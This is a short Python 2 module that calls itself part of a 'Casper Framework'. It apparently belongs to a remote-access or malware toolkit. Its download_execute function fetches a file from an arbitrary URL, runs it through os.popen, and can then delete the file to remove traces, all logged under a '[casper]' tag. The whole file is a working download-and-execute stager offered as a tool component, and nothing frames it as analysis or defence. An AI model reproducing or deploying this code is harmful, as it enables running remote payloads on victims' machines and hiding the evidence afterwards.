'''
Part of Casper Framework
'''
from includes import *

def shellexec(file):
	try:
		spawn = os.popen(file)
		data = spawn.read()
		return True
	except Exception as e:
		return False

def download(url,file):
	try:
		urllib.urlretrieve(url,file)
		return True
	except Exception as e:
		return False

def autodelete(file):
	try:
		os.remove(file)
		return True
	except Exception as e:

		return False	

def download_execute(url,file,autod):
	if (download(url,file) == True):
		logging.debug("[casper] Successfully downloaded file!")
		if (shellexec(file) == True):
			logging.debug("[casper] Successfully executed file!")
			if (autod == 1):
				if (autodelete(file) == True):
					logging.debug("[casper] Successfully deleted the file!")
				else:
					logging.debug("[casper] Unable to delete the file...")
			else:
				pass
		else:
			logging.debug("[casper] Unable to execute file...")
	else:
		logging.debug("[casper] Unable to download file...")
	return True
